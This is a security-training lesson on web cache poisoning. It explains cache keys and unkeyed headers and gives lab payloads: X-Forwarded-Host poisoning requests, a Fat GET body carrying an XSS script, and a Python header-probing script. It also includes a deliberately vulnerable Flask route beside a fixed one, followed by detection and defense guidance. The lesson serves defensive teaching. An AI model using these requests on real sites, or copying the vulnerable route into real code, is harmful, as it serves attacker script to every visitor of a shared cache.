---
schema_version: 1
id: WEB-A08-WEB-CACHE-POISONING
title: "Web Cache Poisoning"
slug: web-cache-poisoning
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  []
cwe:
  - CWE-349
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# Web Cache Poisoning

> [!CAUTION]
> Only practice on systems you own or are explicitly authorized. Use synthetic data, disposable fixtures, and limit resources; do not send payloads to the Internet or real targets.

## 1. Learning Objectives

After this lesson, you can:

- Explain Web Cache Poisoning by the root cause instead of just describing the consequences. 
- Identify the trust boundary, asset, actor, and necessary conditions for the vulnerability to be exploitable. 
- Conduct controlled testing in a local lab and differentiate expected results from false positives. 
- Choose the root control, implement the fix, and retest using positive, negative, and boundary cases.

## 2. Prerequisites

- Grasp the HTTP request/response flow in Web Cache Poisoning scenarios and how to apply input handling across trust boundaries.
- Distinguish between authentication, authorization, and validation.
- Know how to read code/configuration in the language or framework present in the example.
- Have a local lab isolated, synthetic data, observable logs, and clearly defined testing permissions.

## 3. Background Knowledge

Imagine an express mail carrier of a large company (Web Cache). To deliver mail quickly, this person keeps a notebook to categorize mail based on the information written on the envelope: "Shipping method + Recipient address + Subject" (this information is called the **cache key**). If two letters are identical in this information, the mail carrier will simply take the old copy of the letter to deliver it quickly, instead of having to run to the warehouse and search from scratch. However, inside the letter or on the edge of the envelope, there may be additional notes such as: "Please send along the advertising brochure from website X" (this extra information is not used to categorize mail, called **unkeyed inputs**).

Although the mail sender does not pay attention to this auxiliary message when sorting (it does not affect the cache key), the mail composing unit at the origin server reads it and designs the returned mail content based on that message. This is the fatal loophole: The sender still thinks this is a normal letter and stores a copy to send to the next recipients, without realizing that the content inside has been altered based on those auxiliary messages.

```
# Normal cache operation flow
Client A ─→ GET /home ─→ [Cache: MISS] ─→ [Origin Server] ─→ Response (cached)
Client B ─→ GET /home ─→ [Cache: HIT]  ─→ Cached Response (served directly)

# Cache key typically includes:
# Key = METHOD + HOST + PATH + QUERY_STRING
# Unkeyed = Headers (X-Forwarded-Host, Cookie, User-Agent, etc.)
```

```python
# Simplified cache logic (pseudocode)
def handle_request(request):
    # Build cache key from specific request components
    cache_key = f"{request.method}|{request.host}|{request.path}|{request.query}"

    cached = cache.get(cache_key)
    if cached:
        return cached  # Cache HIT — return stored response

    # Cache MISS — forward to origin
    response = origin_server.forward(request)  # Unkeyed headers still affect this!

    if response.is_cacheable():
        cache.store(cache_key, response)  # Store response for future requests

    return response
```

## 4. Description and Root Cause

The **Web Cache Poisoning** vulnerability is like a malicious person sneaking poison into the public water tank of an entire neighborhood. Specifically, the attacker sends a request containing additional messages (unkeyed input such as the `X-Forwarded-Host` header) that contain malicious code. The origin server processes this request, generates a web page infected with the malicious code, and sends it back. The cache sees that this request matches the normal classification and immediately stores the infected page in its storage.

From that moment, the water tank was poisoned. Any other honest user who came to request that website would receive the poisoned copy distributed directly from the cache. Unlike regular attacks that target a single victim, cache poisoning has widespread destructive power: everyone who visits that website will be infected with malware until the cache automatically deletes the old copy or someone detects it and cleans it.

> **Reference:** the technical claims in the lesson are marked with a source; when applying in practice, cross-check with the version/framework being used: [S1], [S2], [S3], [S4], [S5].

## 5. Threat Model and Exploitation Conditions

- **Assets:** HTML / asset shared in cache and cache key.  
- **Actor, authentication, and role:** anonymous controls unkeyed header/body; aggregated user uses the same key.  
- **Exploitation conditions:** input changes the response but is not included in the cache key.  
- **Browser, proxy, framework, and version:** reverse proxy/cache and Flask origin pinned with .lab.test asset loopback; must store actual image/package version along with evidence.  
- **Mandatory evidence:** with correlation ID the input must be appended, determining control and impact on the correct asset; individual status code is not sufficient. [S1]

## 6. Attack Mechanism

For web cache poisoning, the input changes the response but is not part of the cache key. A positive case must demonstrate that the input reaches the correct sink and creates the described effect; a negative case, when origin control is enabled, must be blocked before the side effect. The conclusion applies only to the environment pinned in section 5. [S1]

## 7. Testing in an Authorized Lab

1. **Setup:** launch the reverse proxy/cache and the Flask origin pinned with the .lab.test loopback asset; only load synthetic data, enable application/proxy/datastore logging, and attach correlation ID. 
2. **Baseline:** send a valid input for the web cache poisoning use case; record raw request/response, decide the policy and asset state before testing. 
3. **Input and actions:** use exactly one core payload from item 8 in the annotated context; change one variable at a time and comply with the request cap. 
4. **Expected result:** consider a vulnerable fixture positive only when logs demonstrate the mechanism of “input changes response but is not part of the cache key”; secure fixtures must block before side effects, and boundary inputs must fail closed. 
5. **Cleanup:** delete data, markers, and logs of web cache poisoning; revoke related session/cache, restore snapshot, and confirm no test callbacks/processes remain. 
6. **Safety limits:** run only on loopback/`.lab.test`; do not use real targets, credentials, or data; OOB/DoS/state-changing must have network/CPU/memory/request cap.

## 8. Payloads and Scope of Applicability

The blocks below are minimal lab examples according to the context recorded in the annotation. Before use, check the framework/version, encoding, expected result, and risk; only run in an authorized local fixture. Extended payload belongs to `security_cheatsheet.md`; lessons only retain the core examples.

**Step 1: Find the unkeyed header affecting the response:**

<!-- payload-id: WEB-A08-WEB-CACHE-POISONING-001 -->
<!-- context: HTTP/1.1 request to a disposable reverse-proxy/cache fixture; X-Forwarded-Host is intentionally unkeyed -->
<!-- prerequisites: victim.lab.test and assets.untrusted.lab.test resolve to loopback; cache namespace is unique; one probe; no outbound network -->
<!-- encoding: ASCII HTTP header value; CRLF framing is generated by the harness -->
<!-- expected-result: origin response reflects assets.untrusted.lab.test while the cache trace shows X-Forwarded-Host absent from the key -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```http
# Probe with X-Forwarded-Host header — check if it reflects in response
GET /home HTTP/1.1
Host: victim.lab.test
X-Forwarded-Host: assets.untrusted.lab.test

# If the response contains:
# <script src="https://assets.untrusted.lab.test/resources/main.js"></script>
# Then X-Forwarded-Host is reflected but NOT part of cache key!
```
**Step 2: Send a malicious request to poison the cache:**

<!-- payload-id: WEB-A08-WEB-CACHE-POISONING-002 -->
<!-- context: HTTP/1.1 request to a disposable cache fixture where X-Forwarded-Host affects HTML but not the cache key -->
<!-- prerequisites: isolated cache namespace and synthetic /home; assets.untrusted.lab.test resolves to loopback; one poison request; no outbound network -->
<!-- encoding: ASCII header value and CRLF generated by the raw-request harness -->
<!-- expected-result: cached /home references the loopback untrusted asset origin and cache trace records the fixture-only entry -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```http
# Poison the cache — inject malicious host into cached response
GET /home HTTP/1.1
Host: victim.lab.test
X-Forwarded-Host: assets.untrusted.lab.test

# Response (gets cached with key "GET|victim.lab.test|/home"):
# HTTP/1.1 200 OK
# <link rel="canonical" href="https://assets.untrusted.lab.test/home"/>
# <script src="https://assets.untrusted.lab.test/static/app.js"></script>
```
**Step 3: All users accessing /home are affected:**

<!-- payload-id: WEB-A08-WEB-CACHE-POISONING-003 -->
<!-- context: HTTP/1.1 baseline retrieval from the same disposable cache namespace as WEB-A08-WEB-CACHE-POISONING-002 -->
<!-- prerequisites: poison case completed; one synthetic second client; asset origin loopback-only; no outbound network -->
<!-- encoding: ASCII request with harness-generated CRLF -->
<!-- expected-result: second client receives the cached fixture response referencing assets.untrusted.lab.test; cleanup purges the namespace -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```http
# Innocent user visits the same URL — receives the poisoned cached response
GET /home HTTP/1.1
Host: victim.lab.test

# Response (from cache — contains attacker's payload):
# <script src="https://assets.untrusted.lab.test/static/app.js"></script>
# ^^^ Attacker's JavaScript executes in every visitor's browser!
```
**Advanced technique — Fat GET with unkeyed body:**

<!-- payload-id: WEB-A08-WEB-CACHE-POISONING-004 -->
<!-- context: HTTP/1.1 GET body processed by an intentionally vulnerable translation origin but omitted from its cache key -->
<!-- prerequisites: disposable cache namespace; synthetic translation data; exactly one poison and one verification request; no outbound network -->
<!-- encoding: UTF-8 JSON body is 63 bytes; Content-Length is recalculated by the harness if payload changes -->
<!-- expected-result: vulnerable cache serves the marker script string to the verification client; fixed origin ignores/rejects the GET body or keys safely -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```http
# Some frameworks process body in GET requests — body is unkeyed
GET /api/translations?lang=en HTTP/1.1
Host: victim.lab.test
Content-Length: 63

{"locales":"en","default_locale":"en<script>alert(1)</script>"}

# If the body influences the response but isn't in the cache key,
# the XSS payload gets cached and served to all users
```
**Automatic Detection Tool — Param Miner:**

<!-- payload-id: WEB-A08-WEB-CACHE-POISONING-005 -->
<!-- context: Python 3.12 requests client probing a disposable cache/origin fixture on victim.lab.test -->
<!-- prerequisites: victim.lab.test resolves to loopback; eight-header allowlist; one baseline plus eight probes; no outbound network -->
<!-- encoding: requests generates HTTP framing; canary is ASCII cache-canary.lab.test -->
<!-- expected-result: output reports only headers whose canary appears in the response but not baseline; result is evidence of reflection, not proof of an unkeyed cache input -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```python
# Automated unkeyed header discovery script
import requests

UNKEYED_HEADERS = [
    'X-Forwarded-Host', 'X-Forwarded-Scheme', 'X-Original-URL',
    'X-Rewrite-URL', 'X-Forwarded-Proto', 'X-Host',
    'X-Forwarded-Server', 'Forwarded', 'CF-Connecting-IP'
]

def probe_unkeyed_headers(target_url):
    """Test each header to find those reflected in the response"""
    baseline = requests.get(target_url).text

    for header in UNKEYED_HEADERS:
        canary = "cache-canary.lab.test"  # Reserved local canary value
        response = requests.get(target_url, headers={header: canary})

        if canary in response.text and canary not in baseline:
            print(f"[REFLECTED] {header} → unkeyed and reflected in response!")
        else:
            print(f"[SAFE] {header} — not reflected")

probe_unkeyed_headers("https://victim.lab.test/")
```

## 9. Vulnerable Code and Secure Code

```python
# === VULNERABLE: Reflects X-Forwarded-Host into page without cache key ===
from flask import Flask, request

app = Flask(__name__)

@app.route('/home')
def home():
    # X-Forwarded-Host is used to build asset URLs but NOT in cache key
    cdn_host = request.headers.get('X-Forwarded-Host', 'cdn.victim.lab.test')
    return f'''
    <html>
    <head><script src="https://{cdn_host}/assets/app.js"></script></head>
    <body>Welcome!</body>
    </html>
    '''  # DANGEROUS: attacker controls cdn_host via unkeyed header

# === SECURE: Whitelist allowed hosts, ignore unknown forwarded headers ===
ALLOWED_CDN_HOSTS = {'cdn.victim.lab.test', 'static.victim.lab.test'}

@app.route('/home-secure')
def home_secure():
    cdn_host = request.headers.get('X-Forwarded-Host', 'cdn.victim.lab.test')
    if cdn_host not in ALLOWED_CDN_HOSTS:
        cdn_host = 'cdn.victim.lab.test'  # Fallback to safe default
    return f'''
    <html>
    <head><script src="https://{cdn_host}/assets/app.js"></script></head>
    <body>Welcome!</body>
    </html>
    '''  # SAFE: only whitelisted CDN hosts are used
```

## 10. Detection

- Log actor/session, route or operation, object/resource related to Web Cache Poisoning, policy results, and correlation ID; do not log secrets or entire tokens.
- Compare authorization/validation failures with a valid baseline and alert according to behavior sequences, not just a single payload chain.
- Combine application telemetry, reverse proxy, and datastore to confirm whether the request reached the sink and if there was any impact.
- Scanner or WAF alert is only an investigation signal; it is not the sole proof that a vulnerability exists. [S1]

## 11. Defense

### Compulsory control

- Standardize all inputs causing responses to change into keys or remove them before rendering.
- Apply the same control to all routes, operations, and equivalent processing paths; failure must stop before side effects.

### Defense-in-depth

With Web Cache Poisoning, the following measures help reduce the blast radius or increase detection capability. Rate limit, UUID unpredictable, WAF, CSP, or general validation should not be used as a substitute for original controls.

```http
# Include relevant headers in cache key via Vary header
HTTP/1.1 200 OK
Vary: X-Forwarded-Host, Accept-Language, Accept-Encoding
Cache-Control: public, max-age=3600
```
```nginx
# Nginx — strip dangerous headers before forwarding to origin
proxy_set_header X-Forwarded-Host "";
proxy_set_header X-Original-URL "";
proxy_set_header X-Rewrite-URL "";
```
- **Summary**: Prevent Web Cache Poisoning by including all inputs that affect the response in the cache key, using the Vary header, and configuring CDN securely.
- **Detailed steps**:
  - **Include all inputs that affect the response in the cache key** — use the `Vary` header.
  - **Remove unnecessary unkeyed headers** at the proxy layer before forwarding.
  - **Do not reflect headers in the response** — avoid using header values in HTML output.
  - **Use `Cache-Control: private`** for pages containing user-specific content.
  - **Monitor cache hit rate** — abnormal cache hit rates may be a sign of poisoning.

## 12. Retest

- **Positive case:** with Web Cache Poisoning, the valid flow still works correctly for the actor and allowed data.  
- **Negative case:** same input/resource but unauthorized actor or context is denied without leaking sensitive details.  
- **Boundary case:** check empty values, edge extremes, different encodings, repeated requests, expired session state, and equivalent paths/operations.  
- **Telemetry:** confirm policy decision, application log, proxy log, and datastore side effect match correlation ID.  
- **Retest:** save a minimal scenario reproducing the old error and demonstrate the fix does not depend on WAF/rate limit.

## 13. Common Mistakes

- Only check the status code or response string of Web Cache Poisoning without verifying side effects and logs. 
- Use a correctly formatted payload but with the wrong DBMS, browser, framework, protocol, or injection context. 
- Consider UUID, rate limit, WAF, CSP, or general input validation as a fix for a different root control. 
- Only fix one route while the same sink/policy is used on another route. 
- Conclude that a vulnerability exists without recording the source, fixture version, and observable proof.

## 14. Summary and Checklist

- [ ] Root cause, consequences, and exploitation techniques have been separated.  
- [ ] Actor, role/authentication, trust boundary, technology, and version are clear.  
- [ ] Payload has a unique ID, context, encoding, conditions, expected result, risk, validation, and source.  
- [ ] Code prone to errors/unsafe uses the same framework, version, and use case.  
- [ ] Mandatory controls cannot be replaced with defense-in-depth.  
- [ ] Positive, negative, boundary cases, and telemetry have been retested.  
- [ ] Sensitive technical claims have references in section 17, and all links are only in sections 16–17.  
- [ ] Cleanup is complete; no secrets, real targets, Internet callbacks, or customer data remain.

## 15. Glossary

- **Web Cache**: An intermediate cache that stores copies of server responses for fast distribution to users, helping to reduce system load. 
- **Cache Key**: An identifier string generated from certain components of a request (such as the web address, sending method) used to check if the resource is already available in the cache. 
- **Unkeyed Inputs**: Parts of the request data (such as additional headers) that are not involved in generating the cache key but are still processed by the origin server. 
- **Origin Server**: The original server that handles the website's source code and main database. 
- **Cache MISS**: The status of a request sent to the cache but with no available copy, forcing the request to be forwarded to the origin server. 
- **Cache HIT**: The status of the cache already having a copy of the request and returning it immediately to the user. 
- **Fat GET**: The request HTTP uses the method GET but includes a body, an uncommon behavior that may confuse the cache system. 
- **Vary Header**: The header HTTP used to instruct the cache which client headers should be included in calculating the cache key. 
- **Payload**: Malicious code or data used by an attacker to exploit a vulnerability.

## 16. Related Lessons and Further Reading

- [CRLF Injection](../../05-injection/crlf-injection/) — An attack that inserts newline characters to separate the HTTP response, often used to add malicious headers for Web Cache Poisoning.

## 17. References

- **[S1]** PortSwigger. https://portswigger.net/web-security/web-cache-poisoning — version/status: current version; accessed: 2026-07-18.
- **[S2]** OWASP. https://owasp.org/www-community/attacks/Cache_Poisoning — version/status: current version; accessed: 2026-07-18.
- **[S3]** CWE. https://cwe.mitre.org/data/definitions/349.html — version/status: current version; accessed: 2026-07-18.
- **[S4]** James Kettle. https://portswigger.net/research/practical-web-cache-poisoning — version/status: current version; accessed: 2026-07-18.
- **[S5]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — version/status: current version; accessed: 2026-07-18.